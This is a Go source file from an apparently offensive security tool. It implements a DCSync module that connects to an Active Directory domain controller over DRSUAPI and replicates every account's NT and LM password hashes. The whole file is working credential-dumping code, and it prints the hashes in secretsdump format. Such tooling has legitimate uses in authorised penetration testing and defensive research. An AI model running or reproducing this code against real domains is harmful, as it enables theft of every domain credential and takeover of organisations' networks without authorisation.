// Package dcsync replicates domain user hashes from NTDS via DRSUAPI
// (secretsdump's DCSync mode). DRSUAPI has no SMB named-pipe endpoint, so
// one extra RPC-over-TCP channel (epmapper lookup + dynamic port) is
// unavoidable; it is opened once per invocation and closed once.
package dcsync

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/drsuapi"
	"github.com/mandiant/gopacket/pkg/dcerpc/epmapper"
	"github.com/mandiant/gopacket/pkg/registry"
	"github.com/mandiant/gopacket/pkg/session"

	"anvil/internal/ui"
)

// Channel is one open DRS channel to a DC.
type Channel struct {
	client     *dcerpc.Client
	tp         *dcerpc.TCPTransport
	hBind      []byte
	dsaGuid    [16]byte
	domainDN   string
	sessionKey []byte
}

// User is one replicated domain account.
type User struct {
	SAMAccountName string
	RID            uint32
	NTHash         []byte
	LMHash         []byte
}

// Open dials the DRS channel: endpoint-mapper lookup for the DRSUAPI
// dynamic port, one TCP connect, authenticated bind (NTLM path; Kerberos
// mirrors tools/secretsdump but is untested), DsBind, and domain
// resolution. dnsDomain is the domain's DNS name (e.g. corp.local, from
// the SMB session's NTLM challenge info) — GetDomainDN needs it, as it
// turns a NetBIOS name into the BOGUS naming context "DC=NETBIOSNAME".
// When empty, creds.Domain is used as a fallback. Mirrors
// tools/secretsdump's dumpDCSync setup.
func Open(host, dnsDomain string, creds *session.Credentials) (*Channel, error) {
	if creds.Domain == "" {
		return nil, fmt.Errorf("domain required for dcsync (pass -d)")
	}

	port, err := epmapper.MapTCPEndpoint(host, drsuapi.UUID, drsuapi.MajorVersion)
	if err != nil {
		return nil, fmt.Errorf("map DRSUAPI endpoint: %v", err)
	}

	tp, err := dcerpc.DialTCP(host, port)
	if err != nil {
		return nil, fmt.Errorf("connect DRSUAPI %s:%d: %v", host, port, err)
	}

	client := dcerpc.NewClientTCP(tp)
	if creds.UseKerberos {
		err = client.BindAuthKerberos(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, creds, host)
	} else {
		err = client.BindAuth(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, creds)
	}
	if err != nil {
		tp.Close()
		return nil, fmt.Errorf("bind DRSUAPI: %v", err)
	}

	bindResult, err := drsuapi.DsBind(client)
	if err != nil {
		tp.Close()
		return nil, fmt.Errorf("DsBind: %v", err)
	}

	dcInfo, err := drsuapi.DsDomainControllerInfo(client, bindResult.Handle, creds.Domain)
	if err != nil {
		tp.Close()
		return nil, fmt.Errorf("DsDomainControllerInfo: %v", err)
	}

	dnName := dnsDomain
	if dnName == "" {
		dnName = creds.Domain // last resort; produces a bogus DN for NetBIOS names
		ui.Debugf("dcsync open: no DNS domain from session, falling back to %q", dnName)
	}
	domainDN, err := drsuapi.GetDomainDN(client, bindResult.Handle, dnName)
	if err != nil {
		tp.Close()
		return nil, fmt.Errorf("resolve domain DN: %v", err)
	}

	sk := client.GetSessionKey()
	ui.Debugf("dcsync open: domainDN=%q dsaGuid=%x sessionKeyLen=%d", domainDN, dcInfo.NtdsDsaObjectGuid, len(sk))

	return &Channel{
		client:     client,
		tp:         tp,
		hBind:      bindResult.Handle,
		dsaGuid:    dcInfo.NtdsDsaObjectGuid,
		domainDN:   domainDN,
		sessionKey: sk,
	}, nil
}

// Close tears the channel down.
func (c *Channel) Close() { c.tp.Close() }

// DomainDN returns the naming context this channel replicates.
func (c *Channel) DomainDN() string { return c.domainDN }

// DumpAll pages DRSGetNCChanges until the naming context is exhausted and
// returns every replicated account carrying credentials. Absent hashes are
// reported as the well-known empty-LM/empty-NT constants (as
// tools/secretsdump does).
func (c *Channel) DumpAll() ([]User, error) {
	var users []User
	var usn drsuapi.USNVector
	for {
		result, err := drsuapi.DsGetNCChangesAll(c.client, c.hBind, c.domainDN, c.dsaGuid, c.sessionKey, usn)
		if err != nil {
			return users, fmt.Errorf("DRSGetNCChanges (replication rights required): %v", err)
		}
		ui.Debugf("dcsync page: objects=%d moreData=%v", len(result.Objects), result.MoreData)
		for _, obj := range result.Objects {
			if len(obj.NTHash) == 0 && len(obj.LMHash) == 0 {
				continue
			}
			nt := obj.NTHash
			if len(nt) != 16 {
				nt = registry.EmptyNTHash
			}
			lm := obj.LMHash
			if len(lm) != 16 {
				lm = registry.EmptyLMHash
			}
			users = append(users, User{SAMAccountName: obj.SAMAccountName, RID: obj.RID, NTHash: nt, LMHash: lm})
		}
		if !result.MoreData {
			break
		}
		usn = result.HighWaterMark
	}
	return users, nil
}

// Format renders one account in secretsdump format: DOMAIN\user:RID:lm:nt:::
func Format(domain string, u User) string {
	return fmt.Sprintf("%s\\%s:%d:%s:%s:::",
		domain, u.SAMAccountName, u.RID, hex.EncodeToString(u.LMHash), hex.EncodeToString(u.NTHash))
}

// NetBIOSDomain derives the NetBIOS domain label from a DNS domain (first
// label, uppercased) — mirrors tools/secretsdump's derivation.
func NetBIOSDomain(dnsDomain string) string {
	return strings.ToUpper(strings.Split(dnsDomain, ".")[0])
}
